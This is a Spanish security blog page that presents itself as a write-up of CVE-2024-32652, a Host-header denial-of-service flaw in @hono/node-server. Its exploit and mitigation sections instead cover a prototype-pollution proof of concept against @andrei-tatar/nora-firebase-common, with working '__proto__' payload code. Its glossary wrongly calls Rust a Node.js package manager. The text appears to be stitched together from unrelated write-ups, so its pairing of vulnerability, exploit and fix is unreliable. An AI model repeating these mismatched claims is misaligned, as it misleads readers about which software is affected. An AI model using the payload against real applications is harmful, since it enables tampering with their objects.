<!DOCTYPE html>
<html lang="es">
<head>
	<title>CVE-2024-32652 | ØxBogart</title>

	<!-- meta -->
	<meta charset="utf-8" />
	<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0,user-scalable=no,viewport-fit=cover" />
	<link rel="icon" type="/image/png" href="/blog/img/skullh.png" />
	<link rel="canonical" href="https://0xbogart.github.io/blog/hacking/CVE-2024-32652" />
	<meta name="author" content="0xBogart" />
	<meta name="description" content="CVE-2024-32652" />
	<meta name="keywords" content="CVE-2024-32652" />

	<!-- Twitter Tags -->
	<meta property="og:title" content="CVE-2024-32652" />
	<meta property="og:description" content="CVE-2024-32652" />
	<meta property="og:url" content="https://0xbogart.github.io/blog/hacking/CVE-2024-32652" />
	<meta property="og:image" content="https://0xbogart.github.io/blog/hacking/img/CVE-2024-32652.png" />
	<meta name="twitter:card" content="summary_large_image" />
	<meta name="twitter:site" content="@0xBogart" />
	<meta name="twitter:creator" content="@0xBogart" />
	<meta name="twitter:title" content="CVE-2024-32652 | ØxBogart" />
	<meta name="twitter:description" content="CVE-2024-32652 | ØxBogart" />
	<meta property="twitter:image" content="https://0xbogart.github.io/blog/hacking/img/CVE-2024-32652.png" />

	<!-- css -->
	<link rel="stylesheet" href="/css/bootstrap.min.css">
	<link rel="stylesheet" href="/css/ionicons.min.css">
	<link rel="stylesheet" href="/css/tabbared.css">
	<link rel="stylesheet" href="/css/sidebared.css">
	<link rel="stylesheet" href="/css/pace.css">
	<link rel="stylesheet" href="/css/custom.css">
	<link rel="stylesheet" href="/css/blackarchterm.css">
	<link rel="stylesheet" href="/css/blackarchvoid.css">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">

	<!-- js -->
	<script src="/js/jquery-2.1.3.min.js"></script>
	<script src="/js/bootstrap.min.js"></script>
	<script src="/js/pace.min.js"></script>
	<script src="/js/modernizr.custom.js"></script>
	<script src="/js/tabbar.js"></script>
	<script src="/js/asredlight.js"></script>
<style>
@media (max-width: 600px) {
  .imgmax {
    width: 104%; /* Ancho al 100% para pantallas de 600px o menos */
  }
}

.bg {
	border: 5px solid black;
	width: 100%;
}
</style>
</head>

<body class="bg">
	<div class="container">	
		<header id="site-header">
			<div class="row">
				<div style="margin-bottom: -10%;">
					<h1 style="margin-top: 7px;">H<a href="/blog/hacking"><img src="/blog/img/skullh.png" width="30px" height="40px" style="margin-top: -9px;"></a>CKING</h1>
				</div><!-- col-4 -->
			</div>
			<div class="row justify-content-end">
				<div class="col-2" style="margin-top: 5px;">
					<nav class="navbar navbar-expand-lg navbar-light">
						<button style="border: 1px solid #D80000;" class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#bs-example-navbar-collapse-1" aria-controls="bs-example-navbar-collapse-1" aria-expanded="false" aria-label="Toggle navigation">
							<span class="navbar-toggler-icon"></span>
						</button>
						<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
							<ul class="navbar-nav">
								<li class="nav-item">
									<a style="font-size: 25px;" class="nav-link" href="/index" data-hover="Home">Home</a>
								</li>
							</ul>
						</div><!--- .navbar-collapse --->
					</nav>
				</div><!-- col-md-8 -->
			</div>
		</header>
	</div>

	<!-- TABBAR -->
	<div style="position: sticky; top: -1px; width: auto;">
		<a onclick="toggleDropdown()">
			<div class="tabbar">
				<span style="font-weight: bold; float: left; margin-left: 10px;">TABLA DE CONTENIDO</span>
				<div class="dropdown-content" id="dropdownContent"></div>
			</div>
		</a>
		<div id="contenido">
			<h5>@hono/node-server [CVE-2024-32652] DoS al Recibir encabezado Host no analizable</h5>
			<div style="border-top: 1px solid lightgray; width: 100%; margin: 10px 0;"></div>
			<a href="#VulnerabilityDetails" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: 16px;">☠ Vulnerability Details</p></a>
			<a href="#RUSTLS" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: 16px;">☠ ¿Qué es Rustls?</p></a>
			<a href="#DESCRIPTION" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: 16px;">☠ Descripción de la Vulnerabilidad [CVE-2024-32652]</p></a>
			<a href="#EXPLOIT" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: 16px;">☠ Explotando CVE-2024-32652 [PoC]</p></a>
			<a href="#REMEDIATE" style="text-decoration: none;"><p style="margin-bottom: 6px; font-size: 16px;">☠ Mitigación de la Vulnerabilidad en el Código Fuente</p></a>
		</div>
	</div><!-- END TABBAR -->

	<div class="content-body">
		<div id="main" style="position: sticky; top: 0;">
			<button class="openbtn" onclick="toggleNav()">☠</button>
		</div>
    <br>
		<div id="mySidebar" class="sidebar" style="display: none; position: sticky; top: 0; margin-top: -24px; padding-right: 1px;">
			<a href="javascript:void(0)" class="closebtn" onclick="toggleNav()">×</a>
			<span style="font-size: 25px; color: #ff0000;"><b>&nbsp;✎</b></span><span style="font-size: 25px; color: white;"> <b>Notas</b></span>
			<hr style="color: #ff0000;">
			<a><span style="color: #E5D400;">Rust</span><span class="spanx">: Administrador de paquetes predeterminado para el tiempo de ejecución de JavaScript Node.js</span></a>
			<a><span style="color: #E5D400;">rustls</span><span class="spanx">: Backend NORA Firebase</span></a>
		</div>
    
		<div class="container">
			<div class="row">
				<main class="col-md-8" style="margin-left: auto; margin-right: auto;">
					<article class="post post-1">
						<header  class="entry-header">
							<h1 class="blh1" style="font-size: 33px; word-wrap: break-word; ">@hono/node-server [DoS al Recibir un encabezado Host no analizable]</h1>
							<h2 class="blh2"><a style="color: #DB0000;">CVE</a>-<a style="color: #DB0000;">2024</a>-<a style="color: #DB0000;">32652</a></h2>
						</header>
						<div class="entry-content clearfix">
							<br><br>
							<section id="VulnerabilityDetails">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">DETALLES DE VULNERABILIDAD</span>
								</div><br>
								<div class="leftl">
									<span><b><a style="color: #DB0000;">•</a> Paquete:</b> @hono/node-server [NPM]</span><br>
									<span><b><a style="color: #DB0000;">•</a> Fecha de Publicación:</b> 19 de Abril de 2024</span><br>
									<span><b><a style="color: #DB0000;">•</a> Versiones Afectadas:</b> &gt;= 1.3.0, &lt; 1.10.1</span><br>
									<span><b><a style="color: #DB0000;">•</a> Versiones Parcheadas:</b> 1.10.1</span><br>
									<span><b><a style="color: #DB0000;">•</a> Gravedad:</b> <a style="color: #D80000;">Alta</a> 7.5/10</span><br>
									<span><b><a style="color: #DB0000;">•</a> CVE ID:</b> CVE-2024-32652</span><br>
									<span><b><a style="color: #DB0000;">•</a> Debilidades:</b> CWE-755</span><br>
									<span><b><a style="color: #DB0000;">•</a> Impacto:</b> La aplicación se cuelga cuando recibe una cabecera Host con un valor que @hono/node-server no puede manejar bien.</span><br>
									<span><b><a style="color: #DB0000;">•</a> Repositorio GitHub:</b> <a href="https://github.com/honojs/node-server" target="_blank">https://github.com/honojs/node-server</a></span><br>
									<span><b><a style="color: #DB0000;">•</a> GitHub Commit #162:</b> <a href="https://github.com/honojs/node-server/commit/d847e60249fd8183ba0998bc379ba20505643204" target="_blank"><i class="fab fa-github" style="font-size: 22px; color: darkred;"></i></a></span><br>
									<span><b><a style="color: #DB0000;">•</a> GitHub Commit #163:</b> <a href="https://github.com/honojs/node-server/commit/306d98f02a8671a0a1fb91ac8fe7e281690c05af" target="_blank"><i class="fab fa-github" style="font-size: 22px; color: darkred;"></i></a></span><br>
								</div>
							</section>

							<div style="border-top: 1px solid lightgray; width: 100%; margin: 10px 0;"></div>
								
							<!----- ¿QUÉ ES RUSTLS? ---->
							<section style="margin-top: 130px;" id="WHATISHONO">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">¿QUÉ ES HONO?</span>
								</div><br>
								<div class="leftl">
									<span>Hono es un Framework de aplicaciones web rápido, ligero y basado en estándares web. Compatible con JavaScript en tiempo de ejecución.</span>
									<br><br>
									<span>@hono/node-server es un adaptador Open Source que te permite ejecutar tu aplicación Hono en Node.js.</span>
									<br><br>
									<span>Inicialmente, Hono no fue diseñado para Node.js, pero con el adaptador @hono/node-server puedes usar Hono en Node.js. Utiliza APIs web estándar implementadas en Node.js versión 18 o superior.</span>
								</div>
							</section>
							<!-- END WHATISHONO -->

							<div style="border-top: 1px solid lightgray; width: 100%; margin: 10px 0;"></div>

							<!-- DESCRIPTION -->
							<section style="margin-top: 130px;" id="DESCRIPTION">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">DESCRIPCIÓN DE LA VULNERABILIDAD</span>
								</div><br>
				
								<div class="leftl">
									<span>Las versiones anteriores a 1.10.1 de @hono/node-server se cuelgan cuando reciben una cabecera Host con un valor que @hono/node-server no puede manejar bien.</span>
									<br><br>
									<span>Los valores que no maneja bien son aquellos que no pueden ser parseados por la URL como un nombre de host, tales como una cadena vacía, barras `/`, y otras cadenas. La versión 1.10.1 incluye la corrección de este problema.</span>
								</div>
							</section>
							<!---- END DESCRIPCIÓN ---->

							<div style="border-top: 1px solid lightgray; width: 100%; margin: 10px 0;"></div>

							<!--- EXPLOTANDO CVE-2024-32652 --->
							<section style="margin-top: 130px;" id="EXPLOIT">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">EXPLOTANDO CVE-2024-32652 [PoC]</span>
								</div><br>

								<div class="leftl">
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000;">⦿</a></b> Crear el directorio de trabajo y el archivo <b>cve-2024-32652.js</b> para explotar prueba de concepto [PoC]</span><br>
								</div><p></p>

								<div id="long-terminal">   
									  <!-- Terminal Body -->
									  <section id="terminal__body" style="background: #0C0C0C;">
										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 2px;"><b><span style="color: #00EEDC">// PoC cve-2024-32652.js</span></b></span>
										</div><p></p>
										  
										<div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 2px;"><b>(<span style="color: #EEE300;">async</span> () =&gt; <span style="color: #00EEDC;">{</span></b></span>
										</div>
										  
										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 10px;"><b><span style="color: #EEE300;">const</span> lib = <span style="color: #EEE300;">await import</span>(<span style="color: #C600D6;">'@andrei-tatar/nora-firebase-common'</span>);</b></span>
										  </div>

										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 2px;"><b><span style="color: #00EEDC;">var</span> BAD_JSON = JSON.parse(<span style="color: #C600D6;">'{"__proto__":{"Polución":true}}'</span>)</b></span>
										  </div><p></p>

										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 2px;"><b><span style="color: #00EEDC;">var</span> victim = <span style="color: #00EEDC;">{}</span></b></span>
										  </div>

										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 2px;"><b>console.log(<span style="color: #C600D6;">"Antes de la Polución: "</span>, JSON.stringify(victim.__proto__));</b></span>
										  </div>

										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 2px;"><b><span style="color: #EEE300;">try</span> <span style="color: #00EEDC;">{</span></b></span>
										  </div><p></p>

										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 10px;"><b>lib.updateState (BAD_JSON, <span style="color: #00EEDC;">{}</span>)</b></span>
										  </div>

										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 30px;"><b><span style="color: #00EEDC;">}</span> <span style="color: #EEE300;">catch</span> (e) <span style="color: #00EEDC;">{ }</span></b></span>
										  </div>

										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 2px;"><b>console.log(<span style="color: #C600D6;">"Después de la Polución: "</span>, JSON.stringify(victim.__proto__));</b></span>
										  </div>

										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 2px;"><b><span style="color: #EEE300;">delete</span> <span style="color: #00D68F;">Object</span>.prototype.polluted;</b></span>
										  </div>

										  <div id="terminal__prompt">
											<span id="terminal__prompt--bling" style="margin-left: 2px;"><b><span style="color: #00EEDC;">}</span>)();</b></span>
										  </div>
									  </section>
								</div><br><br>

								<div class="leftl">
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000;">⦿</a></b> Instalar una versión vulnerable del paquete: <b>npm install @andrei-tatar/nora-firebase-common@1.12.0 &amp;&amp; npm fund</b></span><br>
									
									<a href="/blog/hacking/img/npmandrei.png" target="_blank"><img src="/blog/hacking/img/npmandrei.png" class="imgmax" width="100%"></a><br><br><br>
										
									<span style="margin-bottom: 10px;"><b><a style="color: #DB0000;">⦿</a></b> Ejecutar la PoC: <b>node cve-2024-32652.js</b></span><br>
									<a href="/blog/hacking/img/nodeandrei.png" target="_blank"><img src="/blog/hacking/img/nodeandrei.png" class="imgmax" width="100%"></a><br><br>
										
									<span>Como puede verse, antes de la contaminación las llaves <b>{}</b> están vacías, y después de la contaminación almacenan la propiedad {<b>"Polución":true</b>} del objeto <b>BAD_JSON</b>.<br><br>El exploit importa el paquete <b style="background: #CCCCFF;">@andrei-tatar/nora-firebase-common</b> de manera asíncrona mediante la declaración <b>import</b>. Crea un objeto JSON malicioso llamado <b>BAD_JSON</b> con una propiedad <b style="background: #E8E8E8;">__proto__</b> que contaminará al objeto <b>victim</b>.<br><br>Se define un objeto vacío llamado <b>victim</b> que será el objetivo de la contaminación de prototipo e imprime en consola su estado antes de realizar la contaminación.<br><br>Después llama a la función <b>updateState</b> del paquete <b style="background: #CCCCFF;">@andrei-tatar/nora-firebase-common</b> pasándole el objeto BAD_JSON.</span><br><br>
									<span>Esta función realiza la operación que contamina al prototipo que no está correctamente protegido contra la vulnerabilidad <b>Prototype Pollution</b>.</span><br><br>
									<span>Finalmente se imprime en consola el estado del Object.prototype <b>victim</b> tras haberlo contaminado y se elimina la propiedad <b>polluted</b> de Object.prototype.</span>
								</div>
							</section>
							<!--- END EXPLOTANDO CVE-2024-32652 --->								
							
							<div style="border-top: 1px solid lightgray; width: 100%; margin: 10px 0;"></div>

							<!-- REMEDIATE -->
							<section style="margin-top: 130px;" id="REMEDIATE">
								<div class="centext">
									<a style="font-size: 19px; color: rgb(189, 0, 38);">☠ </a><span class="red-bg" style="font-size: 19px;">MITIGACIÓN DE LA VULNERABILIDAD EN EL CÓDIGO FUENTE</span>
								</div><br>
				
								<div class="leftl">
									<span>En GitHub pueden verse las correcciones aplicadas al código fuente de los archivos <b>update-state.test.ts</b> y <b>update-state.ts</b></span>
									<br><br>
									<span>Ahora update-state.test.ts verifica que la función <b>updateState</b> no acepte actualizaciones que provengan de propiedades del prototipo <b style="background: #E8E8E8;">__proto__</b>. Esta implementación asegura que <b style="background: #E8E8E8;">__proto__</b> ya no sea aceptado como una clave válida.</span><p></p>
									<a href="img/update-state.test.ts.png" target="_blank"><img src="img/update-state.test.ts.png" class="imgmax" width="100%"></a><br><br>

									<span>Y por otro lado, la implementación realizada en <b>update-state.ts</b> define el array <b>ignoreKeys</b> que contiene claves que no serán aceptadas durante la actualización de estado. Esto incluye <b style="background: #E8E8E8;">'__proto__'</b>, <b style="background: #E8E8E8;">'constructor'</b> y <b style="background: #E8E8E8;">'prototype'</b>, ya que son comunes en ataques de <b>Prototype Pollution</b>.<br><br>Así que antes de procesar cada clave en el objeto de actualización, verificará si la clave está en el array <b>ignoreKeys</b>. Si lo está, se omitirá esa clave y pasará a la siguiente.</span><p></p>
									<a href="img/update-state.ts.png" target="_blank"><img src="img/update-state.ts.png" class="imgmax" width="100%"></a>
								</div>
							</section>
							<!---- END REMEDIATE ---->
						</div>
					</article>
				</main>
			</div>
		</div>
	</div>
						
	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<div class="copyright">
						<a class="nodeco" href="/index"><img src="/blog/img/0xbogart-shadow.png" style="width: 15%"></a>
					</div>
				</div>
			</div>
		</div>
	</footer>
	<a href="#" id="scrollToTopButtonRed"><i class="fas fa-arrow-up"></i></a>
<script>
function toggleNav() {
  var sidebar = document.getElementById("mySidebar");
  var sidebarDisplay = window.getComputedStyle(sidebar).display;

  if (sidebarDisplay === "none") {
    sidebar.style.display = "block"; // Mostrar el sidebar
    sidebar.style.width = "200px"; // Ancho deseado al mostrar el sidebar
  } else {
    sidebar.style.display = "none"; // Ocultar el sidebar al hacer clic nuevamente
  }
}
</script>
</body>
</html>
